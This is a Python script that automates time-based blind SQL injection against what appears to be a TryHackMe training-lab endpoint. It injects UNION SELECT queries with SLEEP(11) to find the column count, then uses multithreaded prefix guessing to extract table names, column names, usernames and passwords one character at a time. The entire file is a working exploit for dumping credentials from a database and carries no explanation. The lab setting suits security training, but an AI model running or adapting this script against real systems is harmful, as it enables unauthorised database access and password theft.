import requests
import string
from concurrent.futures import ThreadPoolExecutor, as_completed

# Define the target URL and initial username
url = 'https://10-10-76-95.p.thmlabs.com/run'
initial_username = 'admin123'
headers = {
    'Sec-Ch-Ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'Sec-Ch-Ua-Platform': '"Linux"',
    'Sec-Ch-Ua-Mobile': '?0',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.205 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept': '*/*',
    'Origin': 'https://10-10-76-95.p.thmlabs.com/',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://10-10-76-95.p.thmlabs.com/level3',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive'
}

# Function to check if the payload returns a true response (using time-based SQL injection)
def is_true_response(payload):
    data = {
        'level': 4,
        'sql': payload
    }
    response = requests.post(url, headers=headers, data=data)
    return response.json().get('time') >= 11.0

# Function to find the number of columns
def find_number_of_columns():
    for i in range(1, 10):  # Adjust the range as needed
        payload = f"select * from users where username = '{initial_username}' UNION SELECT {','.join(str(x) for x in range(1, i+1))}, SLEEP(11);-- LIMIT 1"
        if is_true_response(payload):
            return i
    return None

# Function to find the database name with dynamic output and multi-threading
def find_database_name(num_columns):
    db_name = 'sqli_four'
    # possible_chars = string.ascii_lowercase + string.digits + '-_'
    # while True:
    #     found = False
    #     with ThreadPoolExecutor(max_workers=20) as executor:
    #         futures = {executor.submit(is_true_response, f"select * from users where username = '{initial_username}' UNION SELECT 1,{','.join(['NULL'] * (num_columns - 1))}, SLEEP(11) WHERE database() LIKE '{db_name + c}%';-- LIMIT 1"): c for c in possible_chars}
    #         for future in as_completed(futures):
    #             c = futures[future]
    #             if future.result():
    #                 db_name += c
    #                 found = True
    #                 print(f"Database name so far: {db_name}")
    #                 break
    #     if not found:
    #         break
    return db_name

# Function to find table names with dynamic output and multi-threading
def find_table_names(db_name, num_columns):
    tables = []
    possible_chars = string.ascii_lowercase + string.digits
    table_name = ''
    searched_prefixes = set()

    while True:
        found = False
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = {
                executor.submit(
                    is_true_response,
                    f"select * from users where username = '{initial_username}' UNION SELECT 1,{','.join(['NULL'] * (num_columns - 1))}, SLEEP(11) FROM information_schema.tables WHERE table_schema='{db_name}' AND table_name LIKE '{table_name + c}%';-- LIMIT 1"
                ): c for c in possible_chars if (table_name + c)[:1] not in searched_prefixes
            }

            for future in as_completed(futures):
                c = futures[future]
                if future.result():
                    table_name += c
                    found = True
                    print(f"Table name so far: {table_name}")
                    break

        if not found:
            if table_name:
                if table_name not in tables:
                    tables.append(table_name)
                print(tables)
                searched_prefixes.add(table_name[:1])
                print(f"Value of prefix: {searched_prefixes}")
                table_name = ''
            else:
                break
    
    return tables

# Function to find column names with dynamic output and multi-threading
def find_column_names(db_name, table_name, num_columns):

    columns = []
    possible_chars = string.ascii_lowercase + string.digits
    column_name = ''
    searched_prefixes = set()
    print(f"Table name: {table_name}, DB name: {db_name}")
    while True:
        found = False
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = {
                executor.submit(
                    is_true_response,
                    f"select * from users where username = '{initial_username}' UNION SELECT 1,{','.join(['NULL'] * (num_columns - 1))}, SLEEP(11) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='{db_name}' AND TABLE_NAME='{table_name}' AND COLUMN_NAME LIKE '{column_name + c}%';-- LIMIT 1"
                ): c for c in possible_chars if (column_name + c)[:3] not in searched_prefixes
            }

            for future in as_completed(futures):
                c = futures[future]
                if future.result():
                    column_name += c
                    found = True
                    print(f"Column name so far: {column_name}")
                    break

        if not found:
            if column_name:
                if column_name not in columns:
                    columns.append(column_name)
                print(f"Found column: {column_name}")
                searched_prefixes.add(column_name[:1])
                column_name = ''
            else:
                break

    return columns

# Function to find usernames with dynamic output and multi-threading
def find_usernames(table_name, num_columns):
    usernames = []
    possible_chars = string.ascii_lowercase + string.digits
    username = ''
    searched_prefixes = set()
    while True:
        found = False
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(is_true_response, f"select * from users where username = '{initial_username}' UNION SELECT 1,{','.join(['NULL'] * (num_columns - 1))}, SLEEP(11) FROM {table_name} WHERE username LIKE '{username + c}%';-- LIMIT 1"): c for c in possible_chars if (username + c)[:3] not in searched_prefixes}
            for future in as_completed(futures):
                c = futures[future]
                if future.result():
                    username += c
                    found = True
                    print(f"Username so far: {username}")
                    break
        if not found:
            if username and username not in usernames:
                usernames.append(username)
                print(f"Found username: {username}")
                searched_prefixes.add(username[:1])
            else:
                break
    return usernames

# Function to find passwords with dynamic output and multi-threading
def find_passwords(table_name, username, num_columns):
    passwords = []
    possible_chars = string.ascii_lowercase + string.digits
    password = ''
    searched_prefixes = set()
    
    while True:
        found = False
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = {
                executor.submit(
                    is_true_response,
                    f"select * from users where username = '{initial_username}' UNION SELECT 1,{','.join(['NULL'] * (num_columns - 1))}, SLEEP(11) FROM {table_name} WHERE username='{username}' AND password LIKE '{password + c}%';-- LIMIT 1"
                ): c for c in possible_chars if (password + c)[:1] not in searched_prefixes
            }
            for future in as_completed(futures):
                c = futures[future]
                if future.result():
                    password += c
                    found = True
                    print(f"Password so far: {password}")
                    break
        if not found:
            if password and password not in passwords:
                passwords.append(password)
                print(f"Found password: {password}")
                searched_prefixes.add(password[:1])
                password = ''
            else:
                break
    return passwords


# Main function to execute the SQL Injection steps
def main():
    num_columns = find_number_of_columns()
    print(f'Number of columns: {num_columns}')

    db_name = find_database_name(num_columns)
    print(f'Database name: {db_name}')

    tables = find_table_names(db_name, num_columns)
    print(f'Tables: {tables}')

    for table in tables:
        columns = find_column_names(db_name, table, num_columns)
        print(f'Columns in {table}: {columns}')

        usernames = find_usernames(table, num_columns)
        print(f'Usernames in {table}: {usernames}')

        for user in usernames:
            passwords = find_passwords(table, user, num_columns)
            print(f'Passwords for {user} in {table}: {passwords}')

if __name__ == '__main__':
    main()
